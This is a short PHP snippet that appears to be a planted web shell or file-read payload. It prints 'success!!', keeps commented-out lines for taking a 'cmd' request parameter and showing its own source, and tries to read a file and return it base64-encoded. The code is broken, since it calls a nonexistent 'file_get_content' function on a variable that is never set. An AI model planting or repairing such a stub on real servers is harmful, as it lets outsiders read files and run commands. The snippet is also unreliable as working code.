<?php
  echo("success!!\n");
  //$command = $_GET['cmd'];
  //echo $command."\n";
  $file = file_get_content($file);
  echo base64_encode($file);
  //show_source(__FILE__);
?>
